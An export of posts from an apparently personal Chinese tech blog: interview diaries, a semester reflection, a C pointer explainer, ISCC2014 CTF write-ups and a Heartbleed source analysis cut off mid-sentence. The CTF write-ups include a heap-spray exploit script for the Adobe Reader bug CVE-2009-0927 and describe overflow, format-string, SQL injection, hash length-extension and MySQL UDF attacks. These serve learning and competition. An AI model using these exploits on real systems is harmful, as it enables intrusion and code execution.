{"posts":[{"title":"实习面试流水账","content":"蘑菇街一面自我介绍工作室的情况介绍解决问题，同学们找我解决什么问题，对工作室整个运维工作的介绍，是不是我来推动这些事的Python元组和列表的区别，简单深拷贝浅拷贝没说得很清楚装饰器，这个比较了解对Django的了解，我说Flask熟悉的一逼项目运维平台，说了说为什么要做这个东西，简单说了下架构Golang的使用经验实习经历。用zabbix干了啥，先用ansible去自动化部署，监控基本信息，对一些基本的信息监控，说到监控日志用shell去处理，问日志大怎么办，我说没遇到过大的，都是每分钟几十的注册量这样的，他表示无奈。其他对城市有没有选择，我说不虚，想到处走走说说自己的优缺点瞎扯一通，问成绩如何，专业成绩还可以，基础课程比较差有什么问题：1蘑菇街的运维规模怎样？大叔回答很详细，刚和美丽说合并，运维团队十几个人，有专门做运维开发的，感觉前景也很不错2我还有什么要改进的？开发方向多熟悉，说我跟他性格很像3还有得面试没？P.S：好久以后收到邮件。。。被拒。。##腾讯###一面一共10分钟，写毛线啊😃简单介绍工作室情况说说运维做什么意向城市为什么是深圳说说自己做的东西说说自己的责任感体现在什么方面华为机试程序猿生涯第二次碰OJ，运气比较好吧，题目比较简单，最重要的是，可以用Python！！一共三题，分别100，200，300分，够100分就算通过，可以参加面试和性格测试结果第一题用Python，5行代码，两分钟就完了，然后慢慢磨后面的两题，然而测试用例没能过完，一共拿了310分。接着就是传说中特别坑爹，影响很大的性格测试，安安心心填吧，不是很在乎，对自己还是蛮有信心的。几天后收到面试通知一面通知8:40到华为，一大早起床，还犹豫了下要不要骑车过去，毕竟3.6公里实在太近，最后还是放弃了。走在园区感觉真是大气和豪迈，竟然有一丝丝的向往。到了面试地点，各种吃的，填填各种表格，华为果然把笔试题都打印出来了，看来要面试的时候问，交简历的时候问我：面C/C++还是JAVA，我：。。。。。都不会面个锤子啊，我真的是想找运维岗的。。。还好对C还是有一定掌握，硬着头皮选了C/C++面试官很和蔼，看着简历问了些项目相关的，又看我不会C++表示很蛋疼，于是让我说说Python，特性什么的，再和C比较，编译的步骤啥的，很基础，看我还会点C，于是让手写字符串反转，链表删除，都很基础。接着就是问学校的经历，说自己运维都做了什么，成绩怎么样，课程学什么，我说密码学什么的，又让我讲具体的加密方式。但看起来还是纠结我不会C++，他们全是C++和JAVA开发，于是让我写了两个脚本，于是说我比较适合测试，问有没有意愿，我想着反正都是来刷面试经验的，接着面吧，于是给我说先回学校，后面等通知面测试。。刚出华为大门，HR一个电话打过来，让赶快回去面试，晕死。以为回去面测试呢，结果直接跟我说等着二面。二面综合面试，满满的人格调查，从天问到地。现场做智力题，问家庭背景，问生涯规划，问做人处事，问人生追求，问生活爱好，问成绩学业。。。后来想想智力题把25+7加得27了好傻逼，说说印象比较深的问题：让我说服他相信我很有潜力，一顿乱扯，天赋啊，毅力啊，经历啊，没想到自己还是很能扯的。。看我写腾讯俱乐部主席和夏令营的事，一直问为什么不去腾讯和阿里什么，各种瞎编。。。最后就是问成绩的事。。还挂着科真的好虚，各种给自己圆。。。一直比较放松，经常讲出让面试官笑的话。。。总结面试当天看到的几本都是研究生，两个面试官都对自己是本科生很新奇，压力好大。。技术面还是比较常规，有点偏重项目经历，综合面感觉好压抑，真的考察容不容易洗脑吧。。四天后收到offer网易网易实习生招聘里并没有运维相关的岗位，于是就在16届的春招里找了系统运维工程师的试试，后来正常的收到了笔试通知，挺高兴的以为有戏，做吧笔试第一次在线笔试，看到是运维工程师专门出的题目，心里一激动，扫了一遍题目，暗自高兴啊，基本全会网易果然务实，选择题都很基础，TCP/IP，C，Linux，数据库，操作系统，Shell都有，做得很爽大题还是比较开放，三题都是网络相关的，TCP拥塞控制和MAC地址相关，比较轻松一题开放性的题目比较考人，两道编程题用Python压力并不大。最终感觉做得很不错，基本全会全做了面试收到面试通知要去杭州网易，由于自己投的是春招岗位，不是很确定最后能不能以实习生的名义去，刚好HR打电话过来问能不能去面试，说明情况后抱歉了，欢迎我秋招再去，遂了结。折800还是为了刷经验。坐俩小时车磨到公司，一看环境，比暑假实习的公司要烂啊，前台都没人，感觉好无奈，但后来认识到不能以貌取人，公司还是可以的笔试一套逻辑题，难度不大，就是烦，没有耐心，一个个分析，感觉都能对，一共12个最后才拿了8分一套专业题，一共5道大题都很基础，数组倒序，反转链表，SQL查询，TOPk问题，最后一个用前后指针求和的问题（描述不清楚）试卷上都用的JAVA开头，被我直接划了用C和Python各种写。。。都做完以后感觉今天问题已经不大了一面做运维架构设计的来面，好年轻好帅。。。看了笔试情况我估计他也没啥好问的，就着简历简单过了一遍，着重说了自己对自动化运维感兴趣，扯到了Python，他问我除了Python本身的优点，其他什么驱使你用Python，当时觉得很诡异，讲道理的话一般不希望单纯对语言感兴趣而用，但是后来理解了，现在市场上培训太多了，都是为了学而学，他希望的是我纯粹喜欢Python而用，刚好我确实是这样，又谈了谈对自动化运维的各种理解，他一直在说平时遇到的问题，我都好好听着以为要让我回答呢，结果他只是给我说说，全程都是他在教我各种东西。。哈哈哈说到折800每天500万uv，日订单量超过唯品会聚美，100万单什么的，500+的服务器，用的node和ruby什么的感觉蛮小清新的，对线上用node的还是挺佩服的又给我说说他们运维的情况，问问我想做哪些方面，分析了下行情顺便就说到对服务器优化也感兴趣，让说说该怎么做，从CPU，内存，磁盘，网络随便说了一说，感觉他就很满意了。。拿了套社招的Python题给我做，都是一些语法和特性，内存管理什么的，都写了写。完了就表示很希望我考虑加入他们二面技术主管面，也没啥问题，问问对运维的理解，我说了说自己体会到的应该有的一些责任感啊，细心啊，稳重啊什么的想做的方向，让我说说对哪些地方可以自动化运维，我说了测试流程和配置管理，他给我理了一遍整个流程，从服务器上架到最终的服务，都可以做的自动化运维，很长见识。最后问问题阶段，问了下怎么老问我开发方向的问题，我TCP/IP，操作系统，数据库都掌握得挺好的啊，都没人问我，他说现在工作都细化了，运维里都分出了网络，DBA，系统等等，所以不要求全会，但掌握了是加分项。。。果然不是大公司那样重基础。。。三面HR面，刚好管校园招聘的HR不在，另一个来问问基本情况，没啥好说的，我还赶着晚上回去坐360笔试呢，头疼得不行，草草了事滚蛋总结算拿到offer了吧，准备看看提前去实习##云巴科技一面提前预约好时间然后视频面试，全程都问简历上的东西。上来就让介绍实习的经历，简单按简历上的理了一遍，问了下监控脚本都做了什么，然后就是Zabbix的api开发是干什么的接着就问工作室的运维情况，问持续集成，按自动化发布的流程回答；接着问网络优化，从代理缓存和多口线路说；开始问项目。运维平台是干什么的，依旧从出发点和解决的问题来回答了。着重问了Golang写的爬虫，先让说说什么是并发，就从Go来说，我从语言层面和实现稍微说了一下，然后问爬虫的难点在哪，先说了下自己开始写并发各部件间的协调，然后就是针对应用场景的反反爬虫策略，举了下搜狗的反爬虫规则和去处理的案例。最后问对运维苦逼这个说法的看法，这个就好办了，毕竟自己喜欢。二面HR面，估计是交叉面吧，后面还有技术面，简单说说个人情况而已三面CEO面，第一次有些压力，一下课就跑回家等着，结果CEO开会耽搁了一会。上来就给人一种霸气的感觉，也是具体问了简历相关的东西，运维平台，爬虫。爬虫问了写的目的，和一面差不多，主要问了怎么处理JS的动态数据，因为现在很多页面都是动态获取数据的，但我的实际运用比较少，都是单独去分析JS的接口然后抓数据，他告诉我有命令行的工具来运维平台问了我怎么写的，具体说了下架构，怎么处理数据可视化，没办法自己前端水平太挫。让举些市面上可视化监控的例子，也有些了解。问了的具体技术不多，Linux下的流量统计，回答的总的流量统计，但没想想起来每个IP怎么去统计，后来提示可以用iptables做日志，顺便iptables的话题，问了NAT原理，探讨了一下实现机制呢因为看过对CEO的访谈，就问了下对优秀工程师的看法总结通知Offer了，让回馈实习时间，很想4月就去，可是事情太麻烦了，留到暑假的机会吧。宜信笔试在线笔试，和360一个系统吧好像，全是JAVA题目，基本不会，各种猜，编程题目不是很难，但是得用C写，做出来一个，还是过了笔试。一面电话面试，事先通知了一个网址，在线直播写代码。。。慌得不行，自己写代码总是不会写变量名。。好绝望的说。先自我介绍吧，才发现自己的简历一直没写什么学院和专业好坑。。然后介绍自己学过的课程。然后就写代码了。。。首先一个很简单的C语言的入门，打印三角形的星号！！！而我竟然没有完整的写出来！！真是丢人，面试官估计不太想等，说了下思路就让过了。接着写一个判断链表有没有环，这个基础了，直接写了函数，也没办法测试，又过了。接着设计的问题，没答出来很蛋疼。告一段落，开始问基础啦！！这么多面试终于等到啦！！进程与线程的区别，直接结合实际来讲，面试官很满意的样子。接着就是OSI模型，TCP，UDP区别，三次握手这些，简直滚瓜烂熟。再接着Linux方面的，shell，查进程，备份日志等，都很简单。技术问题差不多了，让说说下职业规划，自己还是很明确，然后一个处理工作问题的案例，有一个会议要准备，有分配了紧急事情要处理，该怎么办。简直太擅长处理这种问题了，答完后面试官很满意，让等HR面咯。一个小时结束。二面二面通知在学校的教室面得，我是第一个9点去到哪人影都没有，打电话给HR等了会，然后就开始啦一个工程师来面试的，对前面的面试情况完全不了解，感觉这点很不专业。边看简历上的东西边问问题，问的也不多，Linux的命令，让在纸上一直写，在工作室做的事情：对网络的规划，对自动化运维的实践，出了一个问题，就是突然断网该怎么办，让出各种情景下的方案，答得不是很好。然后就问了对运维工作内容的理解。刚面完，旁边的HR姐姐突然问我，你是不是有个师兄叫王瑾，突然就懵了，真的是他吗。。又问了一遍确认。。果然，中午瑾师兄还要请他们吃饭呢，这下好了，大家都是熟人了（强行熟。。）然后在面试官写面试评价的时候一直和HR姐姐聊天，各种扯。三面主管面吧，负责宜信技术研发中心的主管之一，简单的自我介绍，然后就给我介绍宜信的各种业务啊技术中心的情况啊职业发展啊，随即就问我一些常见的问题，考研，女朋友，工作城市，对运维的定位等等，都很好说一顿扯。总结拿到offer，下午师兄跟这批人吃完饭以后给我说，那个主管对我评价特别高，让我好好加油，多尝试几家公司，哈哈。","link":"https://pikez.github.io/post/shi-xi-mian-shi-liu-shui-zhang/"},{"title":"大二下学期总结","content":"简单粗暴的标题，可以啰啰嗦嗦写一大篇，也可以用一个字来总结，忙忙忙忙忙忙（重复一万次关于学业实际上是从上学期开始，整个人已经完全浪了，心中无课便无课。来到大学就没打算在课堂上学到什么知识，体会各种老师的气质和眼界才是想要的。怀念起黄桃，周益民这样的男神老师，还好又多了一个王晓敏这样的女神老师。毕业那天，会后悔逃过的课么。大学以来第一次没有挂科，各种小伙伴考前考后甚至考试中带我飞~~可是还有两科重修过不了，有点小慌，得抓紧了。关于技术前两个月基本忙写运维平台，集各种系统，Web后台，前端，网络开发为一体，造就一个复杂度240的作品（正常应该在10以下。。），自然成为了一个半成品。感觉自己难成为一名优秀的研发，没办法一直坚持写代码。然后继续研究Linux，走的弯路比较多，就是个折腾吧。完完整整看完的书只有几本《Python自动化运维》《构建高性能Web站点》《FlaskWeb开发》《Go并发编程》，浏览过的书不计其数，模模糊糊只留下些印象，还是应该做好读书笔记，把博客和wiki给补回来。还算顺利得找到了实习，投了好几家公司，最想去实验楼做Linux运维开发结果晚了一步，接着过了Testbird和陌陌，担心自己挂科和学校的乱七八糟的事情，选择留在了成都，明年再出去走走吧。另外一些学习大二这一年是我成长最多最快的一年，因为太多没经历过的事情摆在面前必须一件件去做。带俱乐部最大的收获是必须面对各种人，腾讯的各种工程师，经理，学校各种部门，起码交流能力有一定提高吧。俱乐部亮点不多但也算过得去，办好了每一个活动，必须感谢大家的帮助和支持。来到标记里也半年出头了，当初被詹师兄忽悠进来，现在只想感谢他，估计他是这所大学里最看得起我的老师，逢人必把我夸的天花乱坠，真是没脸了~~经历了工作室的变迁合并，大家也都乱成一团，不过都是为了更好的发展，不得不吐槽运维最苦逼，好处没有，背锅永远第一选择。。第一次带项目，麻烦事情简直不要太多，伴随各种折腾和自我安慰，让我现在看见需求两个就颤抖。也没想到这是工作室这学期唯一的项目。会逃避难以面对的事，最忙的情况下还能放下心情和基友们LOL，只是逃避现实而已。仅仅只有搞定一切技术问题的信心。关于友情开始对任何离别感到伤心，哪怕只是短暂不见。一年下来的经历让我把朋友放到了最重要的位置，会珍惜每一个能相处的人。感觉自己是个长不大的人，老是依靠别人，所以也不知道怎么和自己的小的人相处，快到大三渐渐体会当学长的感觉，能够为学弟学妹做一些事，甚至做某些方面的榜样。特别提一下张x正，因为咱俩的关系太微妙，可以无话不说无事不做，原来同性之间能要好到这种程度而没有任何的麻烦，所以我竟然能理解同性恋了。关于亲情很愧疚，表妹中考前一天我才给了她鼓励，太晚了，这就是我对亲情后知后觉的一个展现吧。最难过的是爸妈的关系越来越不好，却无能为力，没想到已经可以淡定地对他们说无论做出什么决定我都不反对，这是所谓的长大还是冷漠，我不知道，只是不想再看到一点不合。那段时间，每天早上7点出门，11点回去，然后坐在楼道口，静静的听妈妈或爸爸在电话里抱怨和哭诉，那种无力感真令人崩溃，恨不得自己能撑住一切。关于爱情呃，好像并没有资格写这一部分乱七八槽的体验酒真的是个好东西，醉了更痛快。被太多人当做弯的，无所谓。享受被人看得起的感觉，看贬自己的还是自己。充斥各种无力和疲累，希望下一学期不要再这样了。","link":"https://pikez.github.io/post/da-er-xia-xue-qi-zong-jie/"},{"title":"C函数参数的传递","content":"最近萌萌的女票在学C语言，刚好又被指针给虐了，而我顺带也被虐了，赶快看看书帮她虐回去。voidswap1(int*p,int*q){intt;t=*p;*p=*q;*p=t;}voidswap2(int*p,int*q){int*t;t=p;p=q;q=t;}intmain(){inta,b,*p,*q;p=&amp;a;q=&amp;b;scanf(&quot;%d%d&quot;,&amp;a,&amp;b);printf(&quot;beforeswapp:%p,q:%p\\n&quot;,&amp;p,&amp;q);swap2(p,q);printf(&quot;afterswapp:%p,q:%p\\n&quot;,&amp;p,&amp;q);printf(&quot;%d%d&quot;,a,b);}这是让她不得其解的代码，为什么swap2不能成功交换两个元素的值，都传的地址呀。然而大多数国内教材上的说法：函数传参有传值和传址两种方式。都是错的或者说表述不清楚。C函数的所有参数均以“传值调用”方式进行传递，也就是每个参数都是拷贝。看一下调用swap2前后的指针地址12beforeswapp:0x7fff5d6069e0,q:0x7fff5d6069d8swap2:p:0x7fff5d6069ec,q:0x7fff5d6069e8swap2:p:0x7fff5d6069e8,q:0x7fff5d6069ecafterswapp:0x7fff5d6069e0,q:0x7fff5d6069d812swap2的流程如下:首先复制了一份p和q，这份p和q仅在函数内存在，可以看到和函数外的p，q并不相同，但他们的值都是a和b的地址，但是内部声明了一个指针变量，所以交换的是函数内部指针本身的地址，在函数返回后，原指针没有发生变化，所以交换不成功。而swap1的流程：声明了一个int变量，交换时取出了指针所指向的值，改变了指针保存的地址的所指向的值（好拗口），虽然这两个指针也是复制的，但指向的地方和外部一样，交换才能成功。","link":"https://pikez.github.io/post/c-han-shu-can-shu-de-chuan-di/"},{"title":"ISCC2014 总结&writeup(二)","content":"web和pwn部分的writeup。pwn溢出以前没接触过，这次玩图书馆借了基本书来来回回琢磨了一下，算是入门了，以后再找机会学点高级点的技术，绕过DEP，ALSR等等。web题感觉注入太多了，来来回回几个注入，不太有劲::&gt;_&lt;::。PWN斗克之乱看到程序运行后肯定是绑定了端口的，查看端口后，打开IDA动态调试后，用python写脚本进行连接，然后发送AA……无效字符来反复触发异常直到定位到异常位置然后看到前面的这个函数给了缓冲区64(40H=60)个字节，将数据处理后多余的字符就覆盖了后面，因为有4个字节弹出到了ebp，再后面4个字节才是eip，所以在64+4=68后放入shellcode便可以控制流程了。找到一个可以打开4444端口的shellcode，写入并连接运行exp.py后，telnet127.0.0.14444得到cmd改革国政此处读入文件并加入wron后打印出来，猜测可能是格式化字符串漏洞，printf（buf）的形式先定位当前的输出点然后把AAAA改为wron的位置,接着把eax修改为ISCC的十六进制0x49534343，倒过来是0x43435349，转为十进制为1128485503。(减去已有的196，为1128485307），通过%x来改写eax的大小。把eax这个数值放进原来wron的位置，就能改写wron。远征郑国找到读取key并验证那段代码，猜测存在溢出通过调试和尝试，发现136字节刚好充满缓冲区，溢出后覆盖地址需要个弹窗ISCC，如果包含00等字符会被截断而不执行，所以写的时候避免0参数的压入由于是从文本读入，直接输入shellcode无法正确转义，所以提取机器码后写几行python脚本处理一下镇压叛乱在看雪出的《0day安全软件漏洞分析技术》一书中30章对CVE-2009-0927adobereader的溢出漏洞进行了分析，就学习了下下这里，直接把原字符串的长度放入了strncpy的第三个参数，相当于strcpy了，所以造成了溢出。大体思路为：通过填充getIcon()函数触发异常，同时覆盖程序SEH指针，再通过堆喷射把0x0c0c0c0c指向的地方填充nop和shellcode。首先来创建一个pdf文档，格式很常见，用wps建个空文档保存为pdf格式就行。然后把第七个对象js保存的地方进行修改。先构造堆喷射。​varnops=unescape(&amp;quot;%u9090%u9090&amp;quot;);while(nops.length&amp;lt;0x10000)nops+=nops;//足够数量的nopnops=nops.substring(0,0x10000-16-shellcode.length);//16为BSTR对象的头信息nops=nops+shellcode;varmemory=newArray();for(vari=0;i&amp;lt;1024;i++)//分配堆，1024块memory[i]+=nops;varstr=unescape(&amp;quot;%0c%0c%0c%0c&amp;quot;);//触发后跳到的地方while(str.length&amp;lt;0x6000)str+=str;app.doc.Collab.getIcon(str+'aaaaD.Zend');//放入问题函数接下来就是构造shellcode的问题，先前写过xpsp3下的cmdshellcode写个python把他转换为unicode的形式，见附件。最后写进js里面，就搞定了WEB霸业蓝图一开始没只想着是不是伪造个图片马然后拿key，试了下行不通，然后继文哥提示了我一下，反应过来数据有输出点而且在网页内，很有可能是XSS，于是修改图片EXIF信息为XSS，上传后Flag就到手Flag：19ojep03君臣论证首先看到题目就蛋疼的看了下每月的内容，因为是查询工具，所以很容易想到是注入。到了这里，在月份后面加上单引号错误，于是开始手注（结合后面的xiaoming的表名）。Flag：9xme0siv2火眼金睛题目说了个“veryCD永垂不朽”用户，于是到社工库（594sgk）查到了信息，登录后台后看到一幅图，打开后有了该页面的代码$auth=false;if(isset($_COOKIE['auth'])){$auth=unserialize($_COOKIE['auth']);$hsh=$_COOKIE['hsh'];if($hsh!==md5($SECRET.strrev($_COOKIE['auth']))){//$SECRETisa8-bitsalt$auth=false;}}else{$auth=false;$s=serialize($auth);setcookie('auth';,$s);setcookie('hs';,md5($SECRET.strrev($s)));}继文哥告诉我是长度扩展攻击，研究大半天后搞到了hash值,4221c14a2bc59a3c2998a531ff7cb929，利用这个到了admin页面，提示postmesomeid！于是乎burp操起，注入。用管理员帐号密码登录后看到一张图片，打开图片找到flagFlag：I_AM_A_VERY_SMART_ADMIN_LOL老马识途看到这个页面就马上去看了http消息头，果然发现了密码，因为只有3秒钟，手动肯定来不及，所以用python写了个脚本搞定。importhttplib,urllib,urllib2importhashlibheader={'User-Agent':'Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/537.36(KHTML,likeGecko)\\Chrome/33.0.1750.117Safari/537.36','cookie':'ASPSESSIONIDCQRTRCRR=IHFPCCDDEBLFJOAJLHMADILO&amp;',\\}url='script2.iscc.org.cn'conn=httplib.HTTPConnection(url)conn.request('ge','/web07_e3a95260b7271954aa59460c134cde7e/')res=conn.getresponse()password=res.getheaders()[9][1]m=hashlib.md5()m.update(password)md5pass=m.hexdigest().upper()params=urllib.urlencode({'pwd':md5pass,'Submit':'提交'})conn2=httplib.HTTPConnection(url)conn2.request('POST','/web07_e3a95260b7271954aa59460c134cde7e/index.asp?action=Check',params,header)response=conn2.getresponse()printresponse.read()Flag：W3b_Pr0Gr4m1ng@_@首次会盟下载附件发现是udf.dll，mysql提权思路吧，由于虚拟机里的mysql版本较高，只能把dll文件放进/lib/plugin里才能运行。createfunctiongetkeyreturnsstringsoname‘udf.dll’selectgetkey()Flag:U_Will_Use_Udf_In_Final_Challenge@2012霸业初成进去看见这个页面，马上加了’试试，有过滤，以为是绕过滤呢，试了大半天，然后才知道可以试试cookie传参数能正常返回，接着就是构造语句拿flagFlag：CaiBuDaoDeMiMa上古神兽传说中的神兽，变量覆盖让人猜简直丧病，但是知道是G=2这回事以后就觉得是我们傻X了下面就是注入了receiver参数没有过滤Flag：8froerf9pu34rjeslfh","link":"https://pikez.github.io/post/iscc2014-zong-jie-and-writeuper2/"},{"title":"ISCC2014 总结&writeup(一）","content":"总的来说是非常有收获的一个多月，但是最后差了一点没能进入决赛还是特别特别的遗憾，最后20分钟竟然从27名掉到了32名，太让人心碎了。只能怪自己实力还是不足啊。明年再战！其实在比赛一开始的时候觉得好多都不会，逆向已经是凝聚招新那会接触过得了，早已忘光。还有各种misc没接触过，无线包分析，安卓逆向，缓冲区溢出等等。充实了一个多月还是比较满足的。晒下得分吧，虽然比较渣。writeup是做题的同时就写的了，思路啥的比较蛋疼，很罗嗦也比较幼稚==。好多大牛都在快结束的时候写了，看看别人的比较好，自己的留个记录吧。Reverse找到杀手一开始把程序扔进IDA，没显示出代码，用peid看到是C#写的，然后就用Reflector打开反编译试试，果然出现了找到验证处的代码privateboolCheckKey(){stringstr=this.textBox1.Text.ToString();stringstr2=&amp;amp;quot;DI0PFY8TP9x61YTtUkmqYQ==&amp;amp;quot;;return(str==str2);}输进去后出现了四张扑克牌图片，都有flag信息，一个个试一下就OK。没反应过来这题为何这么简单，大概他想考得不是这样，因为还给了个密文txt，程序里还有加密解密函数。不管咋做的，能对就行。Flag:Godblessyou避难母国题目的意思应该是让Andy的数字最大，然后就能输出Flag，一开始脑子没反应过来，傻乎乎的跟进程序，去看算法如何将Andy的数字弄到最大，但是运行几次后发现如果Andy的数字最大，会再次进行随机，不会输出Key。所以下面要做的应该是在Andy数字最大时跳转到输出函数（没去想不是最大数能不能跳转==）。跟进程序，找到输出3人数字的部分，callsub_13B13Db的函数就是随机数函数吧，不管它，往下走中间有各种判断条件，通过修改数值进行需要的跳转。这里应该是一个最后输出key的循环，这里可以通过修改判断条件edi使循环输出，var_9c里面的数值直接使用的话是不对的，它进行了一个排序，还有不能修改esi，会影响结果。（不要在意那个溢出吧==）Flag：FireInTheHole流亡齐国这题还是c#程序，有了前面的经验，直接扔进Reflector，找到验证部分的代码privatevoidbutton1_Click(objectsender,EventArgse){stringtext=this.textBox1.Text;stringstr2=Encrypt(text);if((text!=&quot;&quot;)&amp;&amp;(str2==&quot;sXeC6p/mrl93Jyq3F79+Jg==&quot;)){MessageBox.Show(&quot;猜对了！KEY就是你输入的东西&quot;,&quot;成功&quot;,MessageBoxButtons.OK,MessageBoxIcon.Asterisk);}else{MessageBox.Show(&quot;猜错了！请重新猜吧&quot;+str2,&quot;失败&quot;,MessageBoxButtons.OK,MessageBoxIcon.Hand);this.textBox1.Text=&quot;&quot;;}}有个加密过程，看到加密代码publicstaticstringEncrypt(stringtoEncrypt){byte[]bytes=Encoding.UTF8.GetBytes(&quot;swpu2012swpu2012swpu2012swpu2012&quot;);yte[]inputBuffer=Encoding.UTF8.GetBytes(toEncrypt);RijndaelManagedmanaged=newRijndaelManaged();managed.Key=bytes;managed.Mode=CipherMode.ECB;managed.Padding=PaddingMode.PKCS7;byte[]inArray=managed.CreateEncryptor().TransformFinalBlock(inputBuffer,0,inputBuffer.Length);returnConvert.ToBase64String(inArray,0,inArray.Length);}用的c#自带的加密类，看了下MSDN，学着把解密函数写了下，用vs运行一下就OKusingSystem;usingSystem.Collections.Generic;usingSystem.Linq;usingSystem.Text;usingSystem.Threading.Tasks;usingSystem.Security.Cryptography;namespaceConsoleApplication1{classProgram{staticvoidMain(string[]args){byte[]bytes=Encoding.UTF8.GetBytes(&amp;amp;quot;swpu2012swpu2012swpu2012swpu2012&amp;amp;quot;);stringstr2=&amp;amp;quot;sXeC6p/mrl93Jyq3F79+Jg==&amp;amp;quot;;byte[]inArray=System.Convert.FromBase64String(str2);foreach(bytebinstr2){Console.Write(b+&amp;amp;quot;&amp;amp;quot;);}Console.WriteLine(&amp;amp;quot;&amp;amp;quot;);stringplaintext=null;RijndaelManagedmanaged=newRijndaelManaged();managed.Key=bytes;managed.Mode=CipherMode.ECB;managed.Padding=PaddingMode.PKCS7;byte[]result=managed.CreateDecryptor().TransformFinalBlock(inArray,0,inArray.Length);stringstr=System.Text.Encoding.Default.GetString(result);Console.WriteLine(str);//stringfinal=Encoding.UTF8.GetBytes(toEncrypt);//Keeptheconsolewindowopenindebugmode.Console.WriteLine(&amp;amp;quot;Pressanykeytoexit.&amp;amp;quot;);Console.ReadKey();}}}Flag：Ae5_3nCrYpT1on宗女齐姜C程序，果断扔IDA，F9调试走起，找到密码验证部分.text:013E10A0leaecx,[ebp+var_74].text:013E10A3pushecx.text:013E10A4pushoffsetaS;&amp;amp;quot;%s&amp;amp;quot;.text:013E10A9callds:scanf.text:013E10AFaddesp,0Ch.text:013E10B2movecx,offsetaHellow;&amp;amp;quot;hellow&amp;amp;quot;.text:013E10B7leaeax,[ebp+var_74].text:013E10BAleaebx输进去后出来密码Toosimple。。Flag:Eaglewatch何去何从打开IDA忽视了前面的重点，直接跳到下面这部分我以为在strcmp那覆盖返回地址让它跳到401000。纠结了好久。。才发现不行的，关键点是在前面这里通过修改v5的数值判断成功，然后修改call的地址为401000（初始是调用退出函数）进入函数后进行了一个循环得到flag，只不过储存在栈里面。不进行输出的。Flag:(3q&amp;vf2vw%f7Vj9Ookj)逃离临淄首先通过消息断点和字符串查找，找到关键的位置这里先判断了输入的注册码是否为32位并进行了如下的转化，不符合要求就退出。大小写字母向后移动13位，数字向后移动5位，如：原:abcdefghijklmnopqrstuvwxyz1234567890后:nopqrstuvwxyzabcdefghijklm6789012345分析过程大致就这样，给出一个用户名iscc的注册码vabcde-ghijkl-695356a6342440747注册机用C语言写成，写的过程中发现不可能实现任意用户名任意时间的注册，因为生成的那个hash值有可能使得注册码少于31位而不成功（纠结了好会~~）,所以位数不够就重新再生成一次。后面的题目因为复习没时间做出来了，找个时间补上宝藏探秘flag:e41cf485e2a0e8707ff8fc0291f55cec秦王周室flag:C6ua3izS2ze9Wetx退避三舍flag:MD5_is_easy+C9841-4FF72-14430-D82EF-B6AC2","link":"https://pikez.github.io/post/iscc-2014-zong-jie-and-writeup-yi/"},{"title":"Openssl \"Heartbleed\" 漏洞分析","content":"Openssl&quot;heartbleed&quot;漏洞漏洞在4.8爆发的那天就看过漏洞分析，但是太浮躁又对openssl了解不是很深，就没能看懂，今天下载了openssl源码，查了些资料。总算对‘heartbleed’漏洞有个完整的认识。ssl简要原理与心跳包ssl是为网络通信提供安全的一种协议，建立在tcp连接之上，对通信双方身份进行认证并加密传输数据。结构如图：上层是ssl握手层：协商密钥，加密算法等，对双方进行身份认证，同时包含传输的数据。下层是ssl记录层：通过握手层确定的安全参数对数据进行封装，同时通过数据格式来检测消息的完整性。心跳包就是在客户端和服务器间定时通知对方自己状态的一个自己定义的命令字，按照一定的时间间隔发送，类似于心跳，所以叫做心跳包。而ssl中的Heartbeat‘心跳包’存在与握手层。数据格式包括：心跳包类型(type)，载荷长度(length),载荷(payload),填充(padding).漏洞分析结合乌云知识库文章关于openssl“心脏出血”漏洞的分析。下载到存在漏洞的openssl版本为openssl-1.0.1f。存在漏洞的有两个文件ssl/d1_both.c和ssl/t1_lib.c。而乌云的分析文章不但把文件名搞错（d后面是数字1而不是字母l），而且分析的是前者，基于UDP的TLS，而后者才是常用的TCP（无影响的细节...）Ok~开始分析。1.ssl3记录格式和两个宏。typedefstructssl3_record_st{/*r*/inttype;/*typeofrecord*//*rw*/unsignedintlength;/*Howmanybytesavailable*//*r*/unsignedintoff;/*read/writeoffsetinto'buf'*//*rw*/unsignedchar*data;/*pointertotherecorddata*//*rw*/unsignedchar*input;/*wherethedecodebytesare*//*r*/unsignedchar*comp;/*onlyusedwithdecompression-malloc()ed*//*r*/unsignedlongepoch;/*epochnumber,neededbyDTLS1*//*r*/unsignedcharseq_num[8];/*sequencenumber,neededbyDTLS1*/}SSL3_RECORD;该文件位于ssl/ssl3.h中，该文件定义了sslv3记录的各种数据格式，只看对后面比较关键的数据类型：type：1字节。表示请求类型，01表示请求，02表示回应。Length：2字节。保存数据的长度后面全部：各种数据。。#definen2s(c,s)((s=(((unsignedint)(c[0]))&amp;lt;&amp;lt;8)|\\(((unsignedint)(c[1])))),c+=2)#defines2n(s,c)((c[0]=(unsignedchar)(((s)&amp;gt;&amp;gt;8)&amp;amp;0xff),\\c[1]=(unsignedchar)(((s))&amp;amp;0xff)),c+=2)两个宏，位于ssl/ssl_locl.h，心跳处理函数中将使用，可以看出n2s把char数组s中的前两个字节转为unsignedint类型并保存进c。s2n做相反的事情。2.心跳处理函数。inttls1_process_heartbeat(SSL*s){unsignedchar*p=&amp;amp;s-&amp;gt;s3-&amp;gt;rrec.data[0],*pl;unsignedshorthbtype;unsignedintpayload;unsignedintpadding=16;/*Useminimumpadding*//*Readtypeandpayloadlengthfirst*/hbtype=*p++;n2s(p,payload);pl=p;指针p指向上面提到的ssl3数据结构。hbtype：保存心跳包类型，包括请求与响应两个格式；payload：保存荷载长度，就是客户端发送的数据的长度，而服务器把同样长度的数据返回去padding：填充，负责把一个ssl记录给填满；获取心跳包类型放入hbtype把p现在所指的的数据取出两个字节放入payload，也就是length的值。Pl指向后面的数据if(hbtype==TLS1_HB_REQUEST){unsignedchar*buffer,*bp;intr;/*Allocatememoryfortheresponse,sizeis1bytes*messagetype,plus2bytespayloadlength,plus*payload,pluspadding*/buffer=OPENSSL_malloc(1+2+payload+padding);bp=buffer;如果数据类型是请求，便申请内存，大小为:1（type）+2（length）+payload（数据的长度）+padding（填充值）注意到这里的payload是由length的值所给定的，并不一定是数据的真实长度，漏洞就此埋下伏笔。bp指向这段内存。/*Enterresponsetype,lengthandcopypayload*/*bp++=TLS1_HB_RESPONSE;s2n(payload,bp);memcpy(bp,pl,payload);bp+=payload;/*Randompadding*/RAND_pseudo_bytes(bp,padding);开始对数据包进行响应，将回应类型（type)放入bp的第一个字节，s2n如上所知，和n2s相反，把payload的值填充到bp的第二三个字节。重头戏到了，memcpy函数，把从pl后的payload字节放入bp中，而payload的值根本无法确定是数据的真实长度，而是由length给定的。如果实际的payload小于length的值，便会向后